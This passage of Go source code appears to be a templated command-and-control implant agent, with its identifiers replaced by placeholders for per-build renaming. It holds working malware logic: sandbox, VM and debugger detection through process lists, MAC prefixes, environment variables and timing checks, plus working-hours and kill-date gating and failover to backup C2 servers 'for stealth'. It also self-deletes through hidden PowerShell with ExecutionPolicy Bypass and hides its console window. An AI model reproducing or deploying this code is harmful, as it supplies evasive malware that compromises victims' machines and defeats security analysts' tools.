			return true
		}
	}

	username := os.Getenv("USER")
	if username == "" {
		username = os.Getenv("USERNAME")
	}
	if username == "" {
		username = "unknown"
	}
	usernameLower := strings.ToLower(username)
	suspiciousUsers := []string{"sandbox", "malware", "user", "test", "admin"}
	for _, user := range suspiciousUsers {
		if usernameLower == user {
			return true
		}
	}

	interfaces, err := net.Interfaces()
	if err == nil {
		virtualMacPrefixes := []string{"08:00:27", "00:0c:29", "00:50:56", "00:1c:42", "52:54:00"}
		for _, iface := range interfaces {
			mac := iface.HardwareAddr.String()
			mac = strings.ToLower(mac)
			for _, prefix := range virtualMacPrefixes {
				if strings.HasPrefix(mac, prefix) {
					return true
				}
			}
		}
	}

	if a.{AGENT_CHECK_WINDOWS_PROCESSES_FOR_SANDBOX_FUNC}() {
		return true
	}

	currentPath, _ := os.Getwd()
	currentPath = strings.ToLower(currentPath)
	suspiciousPaths := []string{
		"vmware", "virtualbox", "vbox",
		"sandbox", "cuckoo", "cape", "malware",
	}
	for _, path := range suspiciousPaths {
		if strings.Contains(currentPath, path) {
			return true
		}
	}

	envSandboxIndicators := []string{
		"SANDBOX", "CUCKOO", "CAPE", "MALWARE",
		"VIRUSTOTAL", "HYBRID", "ANYRUN",
	}
	for _, envVar := range envSandboxIndicators {
		if os.Getenv(envVar) != "" || os.Getenv(strings.ToLower(envVar)) != "" {
			return true
		}
	}


	suspiciousFiles := []string{
		"C:\\windows\\temp\\vmware_trace.log",  // VMware
		"C:\\windows\\temp\\VirtualBox.log",   // VirtualBox
		"C:\\windows\\system32\\drivers\\VBoxMouse.sys",  // VBox
		"/tmp/vmware_trace.log",  // VMware on Linux
		"/tmp/vbox_mouse.log",    // VBox on Linux
	}
	for _, file := range suspiciousFiles {
		if _, err := os.Stat(file); err == nil {
			return true // File exists
		}
	}

	if a.{AGENT_CHECK_NETWORK_TOOLS_FUNC}() {
		return true
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WORKING_HOURS_FUNC}() bool {
	now := time.Now()
	if a.{AGENT_WORKING_HOURS_FIELD}.Timezone == "UTC" {
		// Use UTC time
		now = now.UTC()
	} else {
		// Use local time for other timezones (for simplicity)
		// Later on, We might want to parse the timezone
	}

	// Check if current day is in the allowed working days
	// Go's Weekday: 0=Sunday, 1=Monday, 2=Tuesday, etc.
	currentWeekday := int(now.Weekday())
	if currentWeekday == 0 {
		currentWeekday = 7 // Sunday is day 7 in our config (1-7 for Monday-Sunday)
	}

	allowed := false
	for _, day := range a.{AGENT_WORKING_HOURS_FIELD}.Days {
		if day == currentWeekday {
			allowed = true
			break
		}
	}

	if !allowed {
		return false
	}

	// Check if current hour is within working hours
	currentHour := now.Hour()
	if currentHour >= a.{AGENT_WORKING_HOURS_FIELD}.StartHour && currentHour < a.{AGENT_WORKING_HOURS_FIELD}.EndHour {
		return true
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_KILL_DATE_FUNC}() bool {
	killTime, err := time.Parse("2006-01-02T15:04:05Z", a.{AGENT_KILL_DATE_FIELD})
	if err != nil {
		// If we can't parse the kill date, assume no kill date (return false to not kill)
		return false
	}

	now := time.Now().UTC()
	return now.After(killTime)
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_PROCESSES_FOR_SANDBOX_FUNC}() bool {
	cmd := exec.Command("tasklist")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	processes := string(output)
	sandboxProcesses := []string{
		"cape", "fakenet", "wireshark", "tcpdump", "ollydbg",
		"x32dbg", "x64dbg", "ida", "gdb", "devenv", "procmon",
		"procexp", "sniff", "netmon", "apimonitor", "regmon",
		"filemon", "immunity", "windbg", "fiddler", "apimon",
		"regmon", "filemon", "sbox", "sandboxie",
	}

	for _, proc := range sandboxProcesses {
		if strings.Contains(strings.ToLower(processes), strings.ToLower(proc)) {
			return true
		}
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_NETWORK_TOOLS_FUNC}() bool {
	if a.{AGENT_DISABLE_SANDBOX_FIELD} {
		return false
	}

	var processes string

	// Only support Windows platform
	cmd := exec.Command("tasklist")
	output, err := cmd.Output()
	if err != nil {
		return false
	}
	processes = string(output)

	networkTools := []string{
		"wireshark", "tcpdump", "tshark", "netsniff", "ettercap", "burp", "mitmproxy",
		"fiddler", "charles", "netcat", "ncat", "socat", "nmap", "zmap", "masscan",
		"theharvester", "maltego", "nessus", "openvas", "nessusd", "snort", "suricata",
		"procmon", "procexp",
	}

	for _, tool := range networkTools {
		if strings.Contains(strings.ToLower(processes), tool) {
			return true
		}
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_DEBUGGERS_FUNC}() bool {
	if a.{AGENT_DISABLE_SANDBOX_FIELD} {
		return false
	}

	if a.{AGENT_CHECK_WINDOWS_PROCESSES_FOR_DEBUGGERS_FUNC}() {
		return true
	}

	if a.{AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}() {
		return true
	}

	start := time.Now()
	time.Sleep(10 * time.Millisecond)
	actualSleep := time.Since(start)
	expectedSleep := 10 * time.Millisecond
	if actualSleep < expectedSleep/2 || actualSleep > expectedSleep*2 {
		return true
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_PROCESSES_FOR_DEBUGGERS_FUNC}() bool {
	cmd := exec.Command("tasklist")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	processes := string(output)
	debuggerProcesses := []string{
		"gdb", "gdbserver", "ollydbg", "x32dbg", "x64dbg", "ida", "windbg",
		"immunity", "devenv", "vsdebug", "msvsmon", "apimonitor", "regmon", "filemon",
	}

	for _, dbg := range debuggerProcesses {
		if strings.Contains(strings.ToLower(processes), strings.ToLower(dbg)) {
			return true
		}
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_CHECK_WINDOWS_DEBUGGER_FUNC}() bool {
	if runtime.GOOS != "windows" || a.{AGENT_DISABLE_SANDBOX_FIELD} {
		return false
	}

	cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-Command",
		"[System.Diagnostics.Debugger]::IsDebuggerPresent()")
	output, err := cmd.Output()
	if err != nil {
		return false
	}

	result := strings.TrimSpace(string(output))
	if strings.Contains(strings.ToLower(result), "true") {
		return true
	}

	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_TRY_FAILOVER_FUNC}() bool {
	if !a.{AGENT_USE_FAILOVER_FIELD} || len(a.{AGENT_FAILOVER_URLS_FIELD}) == 0 {
		return false
	}

	// Check if we should try failover based on failure count
	if a.{AGENT_CURRENT_FAIL_COUNT_FIELD} < a.{AGENT_MAX_FAIL_COUNT_FIELD} {
		return false
	}

	// Set flag to indicate we're in a failover attempt to prevent recursion
	a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} = true

	// Try to register with a failover C2
	originalC2URL := a.{AGENT_CURRENT_C2_URL_FIELD}
	for _, failoverURL := range a.{AGENT_FAILOVER_URLS_FIELD} {
		a.{AGENT_CURRENT_C2_URL_FIELD} = failoverURL

		// Try to register with the failover server
		err := a.{AGENT_REGISTER_FUNC}()
		if err == nil {
			// Successfully connected to failover C2
			a.{AGENT_CURRENT_FAIL_COUNT_FIELD} = 0  // Reset failure count
			a.{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} = time.Now()
			a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} = false  // Reset the flag
			return true
		} else {
			// If registration failed, try the next failover URL
			// Don't print anything for stealth
			// Continue to the next URL
		}
	}

	// If all failover attempts failed, return to the original main C2
	a.{AGENT_CURRENT_C2_URL_FIELD} = originalC2URL
	a.{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} = time.Now()
	a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} = false  // Reset the flag
	return false
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_INCREMENT_FAIL_COUNT_FUNC}() {
	a.{AGENT_CURRENT_FAIL_COUNT_FIELD}++
	a.{AGENT_LAST_CONNECTION_ATTEMPT_FIELD} = time.Now()

	// If we've reached the maximum fail count, try failover, but only if not already in a failover attempt
	// to prevent recursion
	if a.{AGENT_CURRENT_FAIL_COUNT_FIELD} >= a.{AGENT_MAX_FAIL_COUNT_FIELD} && !a.{AGENT_IN_FAILOVER_ATTEMPT_FIELD} {
		a.{AGENT_TRY_FAILOVER_FUNC}()
	}
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_RESET_FAIL_COUNT_FUNC}() {
	a.{AGENT_CURRENT_FAIL_COUNT_FIELD} = 0
}

func (a *{AGENT_STRUCT_NAME}) {AGENT_SELF_DELETE_FUNC}() {
	executable, err := os.Executable()
	if err != nil {
		os.Exit(0)
		return
	}

	go func() {
		time.Sleep(100 * time.Millisecond) // Brief delay to ensure process exits

			psCommand := fmt.Sprintf(`
				Start-Sleep -Milliseconds 500;
				$targetPath = '%s';
				$retries = 0;
				$maxRetries = 10;
				while ($retries -lt $maxRetries) {
					if (Test-Path $targetPath) {
						try {
							Remove-Item -Path $targetPath -Force -ErrorAction Stop;
							break;
						} catch {
							Start-Sleep -Milliseconds 500;
							$retries++;
						}
					} else {
						break;
					}
				}
			`, executable)

			cmd := exec.Command("powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", psCommand)
			cmd.Start()

		os.Exit(0)
	}()
}

func {AGENT_HIDE_CONSOLE_FUNC}() {
	// Hide console window on Windows using direct Windows API calls for immediate effect
	// Method 1: Use ShowWindow to hide the console window
	consoleHandle, _, _ := procGetConsoleWindow.Call()
	if consoleHandle != 0 {
		procShowWindow.Call(
			consoleHandle,  // HWND - console window handle
			uintptr(0),     // nCmdShow - SW_HIDE constant
		)
	}

	// Method 2: Free the console to completely detach from the parent process
	procFreeConsole.Call()
}

func main() {
	// Hide console for Windows
	{AGENT_HIDE_CONSOLE_FUNC}()

	agentID := "{AGENT_ID}"
	secretKey := "{SECRET_KEY}"
	c2URL := "{C2_URL}"
	redirectorHost := "{REDIRECTOR_HOST}"
	redirectorPort := {REDIRECTOR_PORT}
	useRedirector := {USE_REDIRECTOR}
	disableSandbox := {DISABLE_SANDBOX}

	agent, err := New{AGENT_STRUCT_NAME}(agentID, secretKey, c2URL, redirectorHost, redirectorPort, useRedirector, disableSandbox)
	if err != nil {
		os.Exit(1)
	}

	agent.{AGENT_RUN_FUNC}()
}
